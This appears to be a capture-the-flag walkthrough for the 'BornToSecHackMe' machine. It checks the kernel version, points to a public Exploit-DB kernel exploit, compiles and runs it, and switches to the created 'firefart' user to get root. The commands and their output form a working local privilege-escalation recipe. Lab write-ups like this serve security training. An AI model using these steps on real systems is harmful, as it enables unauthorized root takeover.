#### Get kernel version

```
zaz@BornToSecHackMe:~$ uname -r
3.2.0-91-generic-pae
```

#### Searching exploit on google

https://www.exploit-db.com/exploits/40839

#### Compile and execute exploit

```
zaz@BornToSecHackMe:~$ gcc -pthread dirty.c -o dirty -lcrypt
zaz@BornToSecHackMe:~$ ./dirty 123456
```

#### Now switch user to firefart as mentioned in the exploit 

```
zaz@BornToSecHackMe:~$ su firefart
Password:
firefart@BornToSecHackMe:/home/zaz# id
uid=0(firefart) gid=0(root) groups=0(root)
```

#### We are now root
